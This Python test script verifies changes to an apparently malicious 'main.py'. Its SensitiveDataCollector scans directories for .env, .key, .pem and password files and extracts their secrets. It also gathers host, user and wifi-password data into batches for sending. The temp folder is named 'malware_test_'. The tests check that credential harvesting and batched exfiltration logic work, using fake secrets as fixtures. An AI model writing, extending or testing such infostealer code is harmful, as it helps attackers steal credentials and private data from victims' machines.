"""
Test script to verify the modifications to main.py
Tests file content extraction and batch sending functionality
"""

import os
import sys
import json
from pathlib import Path
import tempfile

# Add parent directory to path to import from main.py
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import the modified classes
from main import SensitiveDataCollector, TEXT_EXTRACTABLE_EXTENSIONS

def create_test_files():
    """Create test files for extraction"""
    test_dir = Path(tempfile.mkdtemp(prefix="malware_test_"))
    
    # Create .env file
    env_file = test_dir / "config.env"
    env_file.write_text("""
DATABASE_URL=postgresql://user:password@localhost:5432/mydb
API_KEY=sk_test_1234567890abcdef
SECRET_KEY=super_secret_key_12345
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
""")
    
    # Create .txt file
    txt_file = test_dir / "passwords.txt"
    txt_file.write_text("""
Admin Password: MySecretPass123!
Database: postgres/admin123
Email: user@example.com / EmailPass456
""")
    
    # Create .ini file
    ini_file = test_dir / "config.ini"
    ini_file.write_text("""
[database]
host=localhost
user=admin
password=db_password_123

[api]
endpoint=https://api.example.com
token=Bearer abc123xyz789
""")
    
    # Create .json file
    json_file = test_dir / "secrets.json"
    json_file.write_text(json.dumps({
        "api_key": "1234567890abcdef",
        "client_secret": "secret_value_here",
        "tokens": ["token1", "token2", "token3"]
    }, indent=2))
    
    # Create a large file (should be skipped)
    large_file = test_dir / "large.txt"
    large_file.write_text("X" * (600 * 1024))  # 600KB
    
    return test_dir

def test_text_extractable_extensions():
    """Test TEXT_EXTRACTABLE_EXTENSIONS constant"""
    print("\n[TEST 1] Testing TEXT_EXTRACTABLE_EXTENSIONS")
    print(f"Total extractable extensions: {len(TEXT_EXTRACTABLE_EXTENSIONS)}")
    print(f"Sample extensions: {list(TEXT_EXTRACTABLE_EXTENSIONS)[:10]}")
    
    # Verify key extensions are present
    required = {'.env', '.txt', '.ini', '.json', '.yaml', '.pem', '.key'}
    missing = required - TEXT_EXTRACTABLE_EXTENSIONS
    
    if missing:
        print(f"❌ FAILED: Missing extensions: {missing}")
        return False
    else:
        print("✅ PASSED: All required extensions present")
        return True

def test_file_content_extraction():
    """Test file content extraction"""
    print("\n[TEST 2] Testing File Content Extraction")
    
    test_dir = create_test_files()
    collector = SensitiveDataCollector()
    
    try:
        # Test is_text_extractable
        env_file = test_dir / "config.env"
        if not collector.is_text_extractable(str(env_file)):
            print("❌ FAILED: .env file not recognized as extractable")
            return False
        
        # Test extract_file_content
        content = collector.extract_file_content(str(env_file))
        if not content or "DATABASE_URL" not in content:
            print("❌ FAILED: Content extraction failed or incomplete")
            return False
        
        print(f"✅ PASSED: Extracted {len(content)} bytes from .env file")
        print(f"   Content preview: {content[:100]}...")
        
        # Test large file skipping
        large_file = test_dir / "large.txt"
        large_content = collector.extract_file_content(str(large_file))
        if large_content is not None:
            print("❌ FAILED: Large file should be skipped")
            return False
        
        print("✅ PASSED: Large files correctly skipped")
        return True
        
    finally:
        # Cleanup
        import shutil
        shutil.rmtree(test_dir, ignore_errors=True)

def test_scan_directory():
    """Test directory scanning with content extraction"""
    print("\n[TEST 3] Testing Directory Scanning")
    
    test_dir = create_test_files()
    collector = SensitiveDataCollector()
    
    try:
        files = collector.scan_directory(str(test_dir), max_depth=1)
        
        print(f"Found {len(files)} files")
        
        # Check for content extraction
        files_with_content = [f for f in files if f.get('content_extracted')]
        print(f"Files with extracted content: {len(files_with_content)}")
        
        # Verify .env file was extracted
        env_files = [f for f in files if f.get('extension') == '.env']
        if not env_files:
            print("❌ FAILED: .env file not found")
            return False
        
        if not env_files[0].get('content'):
            print("❌ FAILED: .env file content not extracted")
            return False
        
        print(f"✅ PASSED: Found and extracted content from {len(files_with_content)} files")
        
        # Display sample
        for f in files_with_content[:2]:
            print(f"   - {f['name']} ({f['extension']}): {len(f.get('content', ''))} bytes")
        
        return True
        
    finally:
        import shutil
        shutil.rmtree(test_dir, ignore_errors=True)

def test_batch_sending():
    """Test batch sending logic"""
    print("\n[TEST 4] Testing Batch Sending Logic")
    
    collector = SensitiveDataCollector()
    
    # Create mock data
    mock_data = {
        'timestamp': '2025-12-05T00:00:00',
        'hostname': 'test-host',
        'os': 'Windows',
        'username': 'test-user',
        'sensitive_files': [
            {'name': f'file{i}.txt', 'content': f'content{i}', 'content_extracted': True}
            for i in range(50)  # 50 files to test batching
        ],
        'wifi_passwords': [],
        'extraction_stats': {
            'total_files_found': 50,
            'files_with_content': 50,
            'env_files_found': 10,
            'txt_files_found': 40,
        }
    }
    
    # Test batch calculation
    batch_size = 20
    total_files = len(mock_data['sensitive_files'])
    expected_batches = (total_files + batch_size - 1) // batch_size
    
    print(f"Total files: {total_files}")
    print(f"Batch size: {batch_size}")
    print(f"Expected batches: {expected_batches}")
    
    if expected_batches != 3:
        print(f"❌ FAILED: Expected 3 batches, got {expected_batches}")
        return False
    
    print("✅ PASSED: Batch calculation correct")
    return True

def main():
    """Run all tests"""
    print("="*60)
    print("Testing Modifications to main.py")
    print("="*60)
    
    results = []
    
    results.append(("TEXT_EXTRACTABLE_EXTENSIONS", test_text_extractable_extensions()))
    results.append(("File Content Extraction", test_file_content_extraction()))
    results.append(("Directory Scanning", test_scan_directory()))
    results.append(("Batch Sending Logic", test_batch_sending()))
    
    print("\n" + "="*60)
    print("TEST RESULTS SUMMARY")
    print("="*60)
    
    for test_name, passed in results:
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"{test_name:.<40} {status}")
    
    total_passed = sum(1 for _, passed in results if passed)
    print(f"\nTotal: {total_passed}/{len(results)} tests passed")
    
    if total_passed == len(results):
        print("\n🎉 All tests passed! Modifications are working correctly.")
    else:
        print("\n⚠️ Some tests failed. Please review the modifications.")

if __name__ == "__main__":
    main()

